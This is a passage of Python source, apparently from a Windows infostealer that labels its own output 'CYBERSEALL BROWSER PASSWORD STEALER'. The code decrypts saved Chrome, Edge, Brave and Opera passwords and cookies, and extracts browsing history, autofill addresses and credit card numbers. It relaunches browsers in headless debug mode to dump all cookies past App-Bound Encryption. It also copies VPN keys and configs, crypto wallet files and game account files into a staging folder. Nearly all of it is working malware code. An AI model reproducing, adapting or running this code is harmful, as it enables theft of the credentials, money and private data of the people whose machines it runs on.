                            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                    except:
                        continue
                    

                    for profile in browser_info['profiles']:
                        profile_path = os.path.join(base_path, profile)
                        cookies_path = os.path.join(profile_path, "Cookies")
                        
                        if not os.path.exists(cookies_path):
                            continue
                        
                        try:

                            temp_cookies_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_{profile}_cookies.db")
                            if os.path.exists(temp_cookies_db):
                                os.remove(temp_cookies_db)
                            
                            shutil.copy2(cookies_path, temp_cookies_db)
                            
                            conn = sqlite3.connect(temp_cookies_db)
                            cursor = conn.cursor()
                            

                            valuable_domains = ['discord.com', 'facebook.com', 'twitter.com', 'instagram.com', 'github.com', 'google.com']
                            
                            for domain in valuable_domains:
                                try:
                                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE ? LIMIT 3", (f'%{domain}%',))
                                    cookies = cursor.fetchall()
                                    
                                    for cookie in cookies:
                                        if cookie[2]:
                                            try:
                                                decrypted_value = decrypt_password(cookie[2], master_key)
                                                # Nur vollständig entschlüsselte Cookie-Werte speichern
                                                if (decrypted_value and 
                                                    decrypted_value != "Failed to decrypt" and 
                                                    not decrypted_value.startswith("Partial:") and
                                                    len(decrypted_value) > 5 and
                                                    not any(char in decrypted_value for char in ['�', '\x00', '\ufffd', 'v20'])):
                                                    valuable_cookies.append({
                                                        "browser": f"{browser_name}-{profile}",
                                                        "url": f"COOKIE_{domain}",
                                                        "username": cookie[1],
                                                        "password": decrypted_value[:50],
                                                        "times_used": 0,
                                                        "date_created": 0
                                                    })
                                            except:
                                                pass
                                except:
                                    pass
                            
                            cursor.close()
                            conn.close()
                            
                            try:
                                os.remove(temp_cookies_db)
                            except:
                                pass
                                
                        except:
                            pass
                
                return valuable_cookies
            

            password_data = get_browser_passwords()
            cookie_data = extract_valuable_cookies()
            

            all_data = password_data + cookie_data
            

            pw_data = []
            for pwd in all_data:
                # Nur vollständig entschlüsselte Passwörter verarbeiten
                password = pwd.get('password', '')
                if (password and 
                    password != "Failed to decrypt" and 
                    not password.startswith("Partial:") and
                    len(password) > 3 and
                    not any(char in password for char in ['�', '\x00', '\ufffd', 'v20'])):
                    
                    if pwd.get('times_used', 0) > 0:
                        usage_info = f" | Used: {pwd['times_used']}x"
                    else:
                        usage_info = ""
                    
                    password_entry = f"{pwd['browser']} | {pwd['url']} | {pwd['username']} | {password}{usage_info}"
                    pw_data.append(password_entry)
            

            self.p = pw_data
            
            if pw_data:
                try:
                    with open(os.path.join(self.d, "passwords.txt"), "w", encoding="utf-8") as f:
                        f.write("CYBERSEALL BROWSER PASSWORD STEALER\n")
                        f.write("=" * 60 + "\n\n")
                        

                        browser_groups = {}
                        for password in pw_data:
                            browser = password.split(" |")[0]
                            if browser not in browser_groups:
                                browser_groups[browser] = []
                            browser_groups[browser].append(password)
                        
                        for browser, passwords in browser_groups.items():
                            f.write(f"\n{browser.upper()} ({len(passwords)} passwords)\n")
                            f.write("-" * 50 + "\n")
                            for password in passwords:
                                f.write(password + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"TOTAL PASSWORDS FOUND: {len(pw_data)}\n")
                        f.write(f"BROWSERS SCANNED: {len(browser_groups)}\n")
                        f.write("=" * 60 + "\n")
                        
                except:
                    pass
            
        except:
            pass

    def history(self):
        try:
            history_data = []
            

            browsers = {
                'Chrome': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "History"),
                'Chrome-Profile1': os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1", "History"),
                'Edge': os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "History"),
                'Brave': os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "History"),
                'Opera': os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "History")
            }
            
            for browser_name, history_path in browsers.items():
                if os.path.exists(history_path):
                    try:

                        temp_history_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_history.db")
                        if os.path.exists(temp_history_db):
                            os.remove(temp_history_db)
                        
                        shutil.copy2(history_path, temp_history_db)
                        
                        conn = sqlite3.connect(temp_history_db)
                        cursor = conn.cursor()
                        

                        cursor.execute("""
                            SELECT url, title, visit_count, last_visit_time 
                            FROM urls 
                            ORDER BY last_visit_time DESC 
                            LIMIT 100
                        """)
                        
                        history_entries = cursor.fetchall()
                        
                        for entry in history_entries:
                            if entry[0] and len(entry[0]) > 10:
                                url = entry[0]
                                title = entry[1] if entry[1] else "No Title"
                                visit_count = entry[2] if entry[2] else 0
                                

                                try:
                                    if entry[3]:

                                        chrome_time = entry[3] / 1000000.0
                                        unix_time = chrome_time - 11644473600
                                        if unix_time > 0:
                                            visit_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(unix_time))
                                        else:
                                            visit_time = "Unknown"
                                    else:
                                        visit_time = "Unknown"
                                except:
                                    visit_time = "Unknown"
                                
                                history_entry = f"HISTORY_{browser_name} | {url} | {title} | Visits: {visit_count} | Last: {visit_time}"
                                history_data.append(history_entry)
                        
                        cursor.close()
                        conn.close()
                        
                        try:
                            os.remove(temp_history_db)
                        except:
                            pass
                            
                    except:
                        pass
            
            self.h = history_data
            

            if history_data:
                try:
                    with open(os.path.join(self.d, "browser_history.txt"), "w", encoding="utf-8") as f:
                        f.write("BROWSER HISTORY STEALER\n")
                        f.write("=" * 60 + "\n\n")
                        

                        browser_groups = {}
                        for history_entry in history_data:
                            browser = history_entry.split(" |")[0].replace("HISTORY_", "")
                            if browser not in browser_groups:
                                browser_groups[browser] = []
                            browser_groups[browser].append(history_entry)
                        
                        for browser, entries in browser_groups.items():
                            f.write(f"\n{browser.upper()} HISTORY ({len(entries)} entries)\n")
                            f.write("-" * 50 + "\n")
                            for entry in entries:
                                f.write(entry + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"TOTAL HISTORY ENTRIES: {len(history_data)}\n")
                        f.write("=" * 60 + "\n")
                except:
                    pass
        except:
            pass

    def autofill(self):
        try:
            autofill_data = []
            

            browsers = {}
            
            # Chrome Varianten (erweitert)
            chrome_base = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
            if os.path.exists(chrome_base):
                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                    profile_path = os.path.join(chrome_base, profile, "Web Data")
                    if os.path.exists(profile_path):
                        browsers[f'Chrome-{profile}'] = profile_path
                
                # Automatische Erkennung aller Chrome-Profile
                try:
                    for item in os.listdir(chrome_base):
                        item_path = os.path.join(chrome_base, item)
                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
                            webdata_path = os.path.join(item_path, "Web Data")
                            if os.path.exists(webdata_path) and f'Chrome-{item}' not in browsers:
                                browsers[f'Chrome-{item}'] = webdata_path
                except:
                    pass
            
            # Edge Varianten (erweitert)
            edge_base = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data")
            if os.path.exists(edge_base):
                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                    profile_path = os.path.join(edge_base, profile, "Web Data")
                    if os.path.exists(profile_path):
                        browsers[f'Edge-{profile}'] = profile_path
                
                # Automatische Erkennung aller Edge-Profile
                try:
                    for item in os.listdir(edge_base):
                        item_path = os.path.join(edge_base, item)
                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
                            webdata_path = os.path.join(item_path, "Web Data")
                            if os.path.exists(webdata_path) and f'Edge-{item}' not in browsers:
                                browsers[f'Edge-{item}'] = webdata_path
                except:
                    pass
            
            # Brave (erweitert)
            brave_base = os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data")
            if os.path.exists(brave_base):
                for profile in ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]:
                    profile_path = os.path.join(brave_base, profile, "Web Data")
                    if os.path.exists(profile_path):
                        browsers[f'Brave-{profile}'] = profile_path
                
                # Automatische Erkennung aller Brave-Profile
                try:
                    for item in os.listdir(brave_base):
                        item_path = os.path.join(brave_base, item)
                        if os.path.isdir(item_path) and (item.startswith('Profile') or item == 'Default'):
                            webdata_path = os.path.join(item_path, "Web Data")
                            if os.path.exists(webdata_path) and f'Brave-{item}' not in browsers:
                                browsers[f'Brave-{item}'] = webdata_path
                except:
                    pass
            
            # Opera
            opera_path = os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Web Data")
            if os.path.exists(opera_path):
                browsers['Opera'] = opera_path
            
            for browser_name, webdata_path in browsers.items():
                if os.path.exists(webdata_path):
                    try:
                        # Hole den Verschlüsselungsschlüssel
                        browser_base = os.path.dirname(os.path.dirname(webdata_path))
                        local_state_path = os.path.join(browser_base, "Local State")
                        
                        master_key = None
                        if os.path.exists(local_state_path):
                            try:
                                with open(local_state_path, "r", encoding="utf-8") as f:
                                    local_state = json.loads(f.read())
                                    encrypted_key = local_state["os_crypt"]["encrypted_key"]
                                    master_key = base64.b64decode(encrypted_key)[5:]
                                    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
                            except:
                                pass

                        temp_webdata_db = os.path.join(os.getenv("TEMP"), f"{browser_name}_webdata.db")
                        if os.path.exists(temp_webdata_db):
                            os.remove(temp_webdata_db)
                        
                        shutil.copy2(webdata_path, temp_webdata_db)
                        
                        conn = sqlite3.connect(temp_webdata_db)
                        cursor = conn.cursor()
                        

                        try:
                            cursor.execute("""
                                SELECT guid, company_name, street_address, city, state, zipcode, 
                                       country_code, number, email, language_code
                                FROM autofill_profiles 
                                LIMIT 20
                            """)
                            
                            profiles = cursor.fetchall()
                            
                            for profile in profiles:
                                if any(profile[1:]):
                                    profile_info = f"AUTOFILL_DATA_{browser_name} | Company: {profile[1] or 'N/A'} | Address: {profile[2] or 'N/A'} | City: {profile[3] or 'N/A'} | State: {profile[4] or 'N/A'} | ZIP: {profile[5] or 'N/A'} | Country: {profile[6] or 'N/A'} | Phone: {profile[7] or 'N/A'} | Email: {profile[8] or 'N/A'}"
                                    autofill_data.append(profile_info)
                        except:
                            pass
                        

                        try:
                            cursor.execute("""
                                SELECT guid, name_on_card, expiration_month, expiration_year, 
                                       card_number_encrypted, date_modified
                                FROM credit_cards 
                                LIMIT 10
                            """)
                            
                            cards = cursor.fetchall()
                            
                            for card in cards:
                                if card[1] or card[4]:
                                    card_number = "[ENCRYPTED]"
                                    if master_key and card[4]:
                                        try:
                                            # ULTIMATE KREDITKARTEN-ENTSCHLÜSSELUNG
                                            decrypted_number = None
                                            
                                            # METHODE 1: Standard AES-GCM
                                            try:
                                                if card[4][:3] == b'v10' or card[4][:3] == b'v11':
                                                    iv = card[4][3:15]
                                                    encrypted_data = card[4][15:]
                                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                                    decrypted_number = cipher.decrypt(encrypted_data[:-16]).decode('utf-8')
                                            except:
                                                pass
                                            
                                            # METHODE 2: DPAPI Entschlüsselung
                                            if not decrypted_number:
                                                try:
                                                    result = win32crypt.CryptUnprotectData(card[4], None, None, None, 0)
                                                    if result and result[1]:
                                                        decrypted_number = result[1].decode('utf-8', errors='ignore') if isinstance(result[1], bytes) else str(result[1])
                                                except:
                                                    pass
                                            
                                            # METHODE 3: Verschiedene IV-Positionen
                                            if not decrypted_number:
                                                try:
                                                    for iv_start in [0, 3, 12]:
                                                        for iv_len in [12, 16]:
                                                            if len(card[4]) >= iv_start + iv_len + 16:
                                                                iv = card[4][iv_start:iv_start + iv_len]
                                                                encrypted_data = card[4][iv_start + iv_len:]
                                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                                                decrypted_number = cipher.decrypt(encrypted_data[:-16]).decode('utf-8', errors='ignore')
                                                                if decrypted_number and len(decrypted_number) >= 12:
                                                                    break
                                                        if decrypted_number and len(decrypted_number) >= 12:
                                                            break
                                                except:
                                                    pass
                                            
                                            # METHODE 4: Partial Recovery für Kreditkarten
                                            if not decrypted_number:
                                                try:
                                                    if isinstance(card[4], bytes) and len(card[4]) > 10:
                                                        # Suche nach Kreditkartennummern-Mustern
                                                        for start in range(0, min(len(card[4]), 20)):
                                                            for end in range(start + 12, len(card[4]) + 1):
                                                                chunk = card[4][start:end]
                                                                # Extrahiere nur Zahlen
                                                                numbers = ''.join(chr(c) for c in chunk if 48 <= c <= 57)
                                                                if len(numbers) >= 12 and len(numbers) <= 19:
                                                                    # Prüfe ob es eine gültige Kreditkartennummer sein könnte
                                                                    if numbers.startswith(('4', '5', '3', '6')):  # Visa, MC, Amex, Discover
                                                                        decrypted_number = numbers
                                                                        break
                                                            if decrypted_number:
                                                                break
                                                except:
                                                    pass
                                            
                                            if decrypted_number and len(decrypted_number) >= 12:
                                                # Maskiere die Nummer (zeige nur letzte 4 Ziffern)
                                                card_number = f"****-****-****-{decrypted_number[-4:]}"
                                        except:
                                            pass
                                    
                                    card_info = f"CREDIT_CARD_{browser_name} | Name: {card[1] or 'N/A'} | Expires: {card[2] or 'N/A'}/{card[3] or 'N/A'} | Number: {card_number} | Modified: {card[5] or 'N/A'}"
                                    autofill_data.append(card_info)
                        except:
                            pass
                        
                        cursor.close()
                        conn.close()
                        
                        try:
                            os.remove(temp_webdata_db)
                        except:
                            pass
                            
                    except:
                        pass
            
            self.af = autofill_data
            

            if autofill_data:
                try:
                    with open(os.path.join(self.d, "autofill_data.txt"), "w", encoding="utf-8") as f:
                        f.write("BROWSER AUTOFILL & CREDIT CARD STEALER\n")
                        f.write("=" * 60 + "\n\n")
                        

                        autofill_profiles = [item for item in autofill_data if item.startswith("AUTOFILL_DATA")]
                        credit_cards = [item for item in autofill_data if item.startswith("CREDIT_CARD")]
                        
                        if autofill_profiles:
                            f.write(f"AUTOFILL PROFILES ({len(autofill_profiles)} found)\n")
                            f.write("-" * 50 + "\n")
                            for profile in autofill_profiles:
                                f.write(profile + "\n")
                            f.write("\n")
                        
                        if credit_cards:
                            f.write(f"CREDIT CARDS ({len(credit_cards)} found)\n")
                            f.write("-" * 50 + "\n")
                            for card in credit_cards:
                                f.write(card + "\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"TOTAL AUTOFILL ENTRIES: {len(autofill_data)}\n")
                        f.write("=" * 60 + "\n")
                except:
                    pass
        except:
            pass

    def cookies(self):
        """
        ULTIMATE COOKIE EXTRACTOR - Chrome Remote Debugging Protocol
        Bypass v20 App-Bound Encryption ohne Admin-Rechte
        """
        try:
            cookies_data = []
            
            # Browser-Konfiguration für Remote Debugging
            DEBUG_PORT = 9222
            LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
            APP_DATA = os.getenv('APPDATA')
            PROGRAM_FILES = os.getenv('PROGRAMFILES')
            PROGRAM_FILES_X86 = os.getenv('PROGRAMFILES(X86)')
            
            browsers_config = {
                'Chrome': {
                    'bin': rf"{PROGRAM_FILES}\Google\Chrome\Application\chrome.exe",
                    'user_data': rf'{LOCAL_APP_DATA}\Google\Chrome\User Data',
                    'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"]
                },
                'Edge': {
                    'bin': rf"{PROGRAM_FILES_X86}\Microsoft\Edge\Application\msedge.exe",
                    'user_data': rf'{LOCAL_APP_DATA}\Microsoft\Edge\User Data',
                    'profiles': ["Default", "Profile 1", "Profile 2", "Profile 3"]
                },
                'Brave': {
                    'bin': rf"{PROGRAM_FILES}\BraveSoftware\Brave-Browser\Application\brave.exe",
                    'user_data': rf'{LOCAL_APP_DATA}\BraveSoftware\Brave-Browser\User Data',
                    'profiles': ["Default", "Profile 1", "Profile 2"]
                }
            }
            
            def close_browser(bin_path):
                """Browser-Prozesse beenden"""
                try:
                    import pathlib
                    proc_name = pathlib.Path(bin_path).name
                    subprocess.run(f'taskkill /F /IM {proc_name}', check=False, shell=False, 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    pass
            
            def start_browser_debug(bin_path, user_data_path, profile=None):
                """Browser mit Remote Debugging starten"""
                try:
                    args = [
                        bin_path,
                        '--restore-last-session',
                        f'--remote-debugging-port={DEBUG_PORT}',
                        '--remote-allow-origins=*',
                        '--headless',
                        f'--user-data-dir={user_data_path}'
                    ]
                    
                    if profile and profile != "Default":
                        args.append(f'--profile-directory={profile}')
                    
                    return subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                except:
                    return None
            
            def get_debug_ws_url():
                """WebSocket Debug URL abrufen"""
                try:
                    import time
                    time.sleep(2)  # Warte bis Browser gestartet ist
                    response = requests.get(f'http://localhost:{DEBUG_PORT}/json', timeout=5)
                    data = response.json()
                    return data[0]['webSocketDebuggerUrl'].strip()
                except:
                    return None
            
            def get_all_cookies_debug(ws_url):
                """Alle Cookies über WebSocket Debug Protocol abrufen"""
                try:
                    import websocket
                    ws = websocket.create_connection(ws_url, timeout=10)
                    ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
                    response = ws.recv()
                    response_data = json.loads(response)
                    cookies = response_data.get('result', {}).get('cookies', [])
                    ws.close()
                    return cookies
                except:
                    return []
            
            # Extrahiere Cookies von allen Browsern
            for browser_name, config in browsers_config.items():
                if not os.path.exists(config['bin']):
                    continue
                
                # Für jeden Browser alle Profile durchgehen
                for profile in config['profiles']:
                    profile_path = os.path.join(config['user_data'], profile)
                    if not os.path.exists(profile_path):
                        continue
                    
                    try:
                        # Browser schließen falls läuft
                        close_browser(config['bin'])
                        
                        # Browser mit Debug-Modus starten
                        browser_process = start_browser_debug(config['bin'], config['user_data'], profile)
                        if not browser_process:
                            continue
                        
                        # WebSocket URL abrufen
                        ws_url = get_debug_ws_url()
                        if not ws_url:
                            browser_process.terminate()
                            continue
                        
                        # Cookies über Debug Protocol abrufen
                        debug_cookies = get_all_cookies_debug(ws_url)
                        
                        # Browser beenden
                        browser_process.terminate()
                        close_browser(config['bin'])
                        
                        # Cookies verarbeiten
                        for cookie in debug_cookies:
                            try:
                                cookie_info = {
                                    'browser': f"{browser_name}-{profile}",
                                    'host': cookie.get('domain', ''),
                                    'name': cookie.get('name', ''),
                                    'path': cookie.get('path', '/'),
                                    'value': cookie.get('value', '')[:100] + "..." if len(cookie.get('value', '')) > 100 else cookie.get('value', ''),
                                    'expires': cookie.get('expires', 0),
                                    'secure': cookie.get('secure', False),
                                    'httponly': cookie.get('httpOnly', False),
                                    'samesite': cookie.get('sameSite', ''),
                                    'size': cookie.get('size', 0)
                                }
                                cookies_data.append(cookie_info)
                            except:
                                continue
                        
                        # Kurze Pause zwischen Profilen
                        import time
                        time.sleep(1)
                        
                    except Exception as e:
                        try:
                            if 'browser_process' in locals():
                                browser_process.terminate()
                            close_browser(config['bin'])
                        except:
                            pass
                        continue
            
            self.co = cookies_data
            
            # Cookies in Dateien speichern
            if cookies_data:
                try:
                    # JSON Format für strukturierte Daten
                    with open(os.path.join(self.d, "cookies.json"), "w", encoding="utf-8") as f:
                        json.dump(cookies_data, f, indent=2, ensure_ascii=False)
                    
                    # TXT Format für einfache Lesbarkeit
                    with open(os.path.join(self.d, "cookies.txt"), "w", encoding="utf-8") as f:
                        f.write("BROWSER COOKIES EXTRACTOR (Remote Debug Protocol)\n")
                        f.write("=" * 60 + "\n\n")
                        
                        # Gruppiere nach Browser
                        browsers_found = {}
                        for cookie in cookies_data:
                            browser = cookie['browser']
                            if browser not in browsers_found:
                                browsers_found[browser] = []
                            browsers_found[browser].append(cookie)
                        
                        for browser, browser_cookies in browsers_found.items():
                            f.write(f"{browser.upper()} ({len(browser_cookies)} cookies)\n")
                            f.write("-" * 50 + "\n")
                            
                            for cookie in browser_cookies[:25]:  # Zeige 25 pro Browser
                                f.write(f"Host: {cookie['host']}\n")
                                f.write(f"Name: {cookie['name']}\n")
                                f.write(f"Value: {cookie['value']}\n")
                                f.write(f"Path: {cookie['path']}\n")
                                f.write(f"Secure: {cookie['secure']} | HttpOnly: {cookie['httponly']}\n")
                                f.write(f"SameSite: {cookie.get('samesite', 'None')} | Size: {cookie.get('size', 0)} bytes\n")
                                f.write("-" * 30 + "\n")
                            
                            if len(browser_cookies) > 25:
                                f.write(f"... and {len(browser_cookies) - 25} more cookies\n")
                            f.write("\n")
                        
                        f.write("=" * 60 + "\n")
                        f.write(f"TOTAL COOKIES EXTRACTED: {len(cookies_data)}\n")
                        f.write("Extraction Method: Chrome Remote Debugging Protocol\n")
                        f.write("Bypasses v20 App-Bound Encryption without Admin rights\n")
                        f.write("=" * 60 + "\n")
                except:
                    pass
        except:
            pass

    def vpn(self):
        try:
            vpn_data = []
            

            vpn_paths = {
                'OpenVPN Connect': os.path.join(os.getenv("APPDATA"), "OpenVPN Connect", "profiles"),
                'Mullvad VPN': os.path.join(os.getenv("APPDATA"), "Mullvad VPN"),
                'Proton VPN': os.path.join(os.getenv("LOCALAPPDATA"), "ProtonVPN"),
                'Nord VPN': os.path.join(os.getenv("LOCALAPPDATA"), "NordVPN"),
                'Express VPN': os.path.join(os.getenv("LOCALAPPDATA"), "ExpressVPN"),
                'CyberGhost': os.path.join(os.getenv("LOCALAPPDATA"), "CyberGhost"),
                'Surfshark': os.path.join(os.getenv("LOCALAPPDATA"), "Surfshark"),
                'Vypr VPN': os.path.join(os.getenv("LOCALAPPDATA"), "VyprVPN"),
                'Windscribe': os.path.join(os.getenv("LOCALAPPDATA"), "Windscribe"),
                'Hide.me': os.path.join(os.getenv("LOCALAPPDATA"), "hide.me VPN"),
                'Hotspot Shield': os.path.join(os.getenv("LOCALAPPDATA"), "Hotspot Shield"),
                'TunnelBear': os.path.join(os.getenv("LOCALAPPDATA"), "TunnelBear"),
                'IPVanish': os.path.join(os.getenv("LOCALAPPDATA"), "IPVanish"),
                'HMA VPN': os.path.join(os.getenv("LOCALAPPDATA"), "HMA VPN"),
                'ZenMate': os.path.join(os.getenv("LOCALAPPDATA"), "ZenMate"),
                'Pure VPN': os.path.join(os.getenv("LOCALAPPDATA"), "PureVPN"),
                'TorGuard': os.path.join(os.getenv("LOCALAPPDATA"), "TorGuard"),
                'Betternet': os.path.join(os.getenv("LOCALAPPDATA"), "Betternet"),
                'PrivateVPN': os.path.join(os.getenv("LOCALAPPDATA"), "PrivateVPN"),
                'VPN Unlimited': os.path.join(os.getenv("LOCALAPPDATA"), "VPN Unlimited"),
                'Goose VPN': os.path.join(os.getenv("LOCALAPPDATA"), "GooseVPN"),
                'SaferVPN': os.path.join(os.getenv("LOCALAPPDATA"), "SaferVPN"),
                'Private Internet Access': os.path.join(os.getenv("LOCALAPPDATA"), "Private Internet Access"),
                'SoftEther VPN': os.path.join("C:", "Program Files", "SoftEther VPN Client")
            }
            
            for vpn_name, vpn_path in vpn_paths.items():
                if os.path.exists(vpn_path):
                    try:

                        vpn_dest = os.path.join(self.d, f"vpn_{vpn_name.replace(' ', '_')}")
                        if not os.path.exists(vpn_dest):
                            os.makedirs(vpn_dest)
                        

                        for root, dirs, files in os.walk(vpn_path):
                            for file in files[:20]:
                                if file.lower().endswith(('.ovpn', '.conf', '.config', '.json', '.xml', '.dat', '.key', '.crt', '.pem')):
                                    try:
                                        src_file = os.path.join(root, file)
                                        if os.path.getsize(src_file) < 10*1024*1024:
                                            dest_file = os.path.join(vpn_dest, file)
                                            shutil.copy2(src_file, dest_file)
                                    except:
                                        pass
                        

                        if os.path.exists(vpn_dest) and os.listdir(vpn_dest):
                            vpn_data.append(f"{vpn_name}: {len(os.listdir(vpn_dest))} files")
                        else:
                            try:
                                os.rmdir(vpn_dest)
                            except:
                                pass
                    except:
                        pass
            
            self.v = vpn_data
            

            if vpn_data:
                try:
                    with open(os.path.join(self.d, "vpn_summary.txt"), "w", encoding="utf-8") as f:
                        f.write("VPN STEALER RESULTS\n")
                        f.write("=" * 50 + "\n\n")
                        for vpn_info in vpn_data:
                            f.write(f"{vpn_info}\n")
                        f.write(f"\nTotal VPNs found: {len(vpn_data)}\n")
                except:
                    pass
        except:
            pass

    def fi(self):
        try:
            files_data = []
            

            target_dirs = [
                os.path.join(os.getenv("USERPROFILE"), "Desktop"),
                os.path.join(os.getenv("USERPROFILE"), "Documents"),
                os.path.join(os.getenv("USERPROFILE"), "Downloads")
            ]
            
            for d in target_dirs:
                if os.path.exists(d):
                    for r, ds, fs in os.walk(d):
                        for f in fs[:10]:
                            if any(keyword in f.lower() for keyword in self.keywords) and f.lower().endswith(('.txt','.key','.wallet','.json','.dat')) and os.path.getsize(os.path.join(r,f)) < 1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "file_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 10:
                                    break
                        if len(files_data) >= 10:
                            break
                    if len(files_data) >= 10:
                        break
            

            crypto_paths = [
                os.path.join(os.getenv("APPDATA"), "Exodus"),
                os.path.join(os.getenv("APPDATA"), "atomic"),
                os.path.join(os.getenv("APPDATA"), "Electrum"),
                os.path.join(os.getenv("APPDATA"), "MetaMask"),
                os.path.join(os.getenv("APPDATA"), "Phantom"),
                os.path.join(os.getenv("APPDATA"), "TronLink"),
                os.path.join(os.getenv("APPDATA"), "Binance"),
                os.path.join(os.getenv("LOCALAPPDATA"), "Coinomi")
            ]
            
            for cp in crypto_paths:
                if os.path.exists(cp):
                    for r, ds, fs in os.walk(cp):
                        for f in fs[:5]:
                            if f.lower().endswith(('.wallet','.dat','.key','.json')) and os.path.getsize(os.path.join(r,f)) < 5*1024*1024:
                                fp = os.path.join(r, f)
                                files_data.append(fp)
                                try:
                                    shutil.copy2(fp, os.path.join(self.d, "crypto_" + str(len(files_data)) + "_" + f))
                                except:
                                    pass
                                if len(files_data) >= 15:
                                    break
                        if len(files_data) >= 15:
                            break
                    if len(files_data) >= 15:
                        break
            
            self.f = files_data
            with open(os.path.join(self.d, "files.txt"), "w") as f:
                f.write("\n".join(files_data))
        except:
            pass

    def games(self):
        try:
            game_data = []
            

            game_paths = {
                'Steam': {
                    'config': os.path.join("C:", "Program Files (x86)", "Steam", "config"),
                    'userdata': os.path.join("C:", "Program Files (x86)", "Steam", "userdata")
                },
                'Minecraft': {
                    'launcher_accounts': os.path.join(os.getenv("APPDATA"), ".minecraft", "launcher_accounts_microsoft_store.json"),
                    'tlauncher': os.path.join(os.getenv("APPDATA"), ".minecraft", "TlauncherProfiles.json"),
                    'badlion': os.path.join(os.getenv("APPDATA"), "Badlion Client", "accounts.json"),
                    'lunar': os.path.join(os.getenv("USERPROFILE"), ".lunarclient", "settings", "game", "accounts.json"),
                    'feather': os.path.join(os.getenv("APPDATA"), ".feather", "accounts.json"),
                    'impact': os.path.join(os.getenv("APPDATA"), ".minecraft", "Impact", "alts.json"),
                    'meteor': os.path.join(os.getenv("APPDATA"), ".minecraft", "meteor-client", "accounts.nbt"),
                    'polymc': os.path.join(os.getenv("APPDATA"), "PolyMC", "accounts.json"),
                    'rise': os.path.join(os.getenv("APPDATA"), ".minecraft", "Rise", "alts.txt"),
                    'novoline': os.path.join(os.getenv("APPDATA"), ".minecraft", "Novoline", "alts.novo"),
                    'paladium': os.path.join(os.getenv("APPDATA"), "paladium-group", "accounts.json")
                },
                'Riot Games': {
                    'config': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Config"),
                    'data': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Data"),
                    'logs': os.path.join(os.getenv("LOCALAPPDATA"), "Riot Games", "Riot Client", "Logs")
                },
                'Epic Games': {
                    'settings': os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved", "Config", "Windows", "GameUserSettings.ini")
                },
                'Uplay': {
                    'settings': os.path.join(os.getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
                },
                'NationsGlory': {
                    'localstorage': os.path.join(os.getenv("APPDATA"), "NationsGlory", "Local Storage", "leveldb")
                }
            }
            
            for game_name, paths in game_paths.items():
                game_files_found = []
                
                for path_name, path_location in paths.items():
                    if isinstance(path_location, str) and os.path.exists(path_location):
                        try:

                            game_dest = os.path.join(self.d, f"game_{game_name.replace(' ', '_')}")
                            if not os.path.exists(game_dest):
                                os.makedirs(game_dest)
                            
                            if os.path.isfile(path_location):

                                if os.path.getsize(path_location) < 50*1024*1024:
                                    dest_file = os.path.join(game_dest, f"{path_name}_{os.path.basename(path_location)}")
                                    shutil.copy2(path_location, dest_file)
                                    game_files_found.append(f"{path_name}: {os.path.basename(path_location)}")
                            else:

                                path_dest = os.path.join(game_dest, path_name)
                                if not os.path.exists(path_dest):
                                    os.makedirs(path_dest)
                                
                                file_count = 0
                                for root, dirs, files in os.walk(path_location):
                                    for file in files[:10]:
                                        if file.lower().endswith(('.json', '.txt', '.dat', '.config', '.ini', '.xml', '.vdf', '.novo', '.nbt')):
                                            try:
                                                src_file = os.path.join(root, file)
                                                if os.path.getsize(src_file) < 10*1024*1024:
                                                    rel_path = os.path.relpath(src_file, path_location)
                                                    dest_file = os.path.join(path_dest, rel_path)
                                                    dest_dir = os.path.dirname(dest_file)
                                                    if not os.path.exists(dest_dir):
                                                        os.makedirs(dest_dir)
                                                    shutil.copy2(src_file, dest_file)
                                                    file_count += 1
                                            except:
                                                pass
                                        if file_count >= 10:
                                            break
                                    if file_count >= 10:
                                        break
                                
                                if file_count > 0:
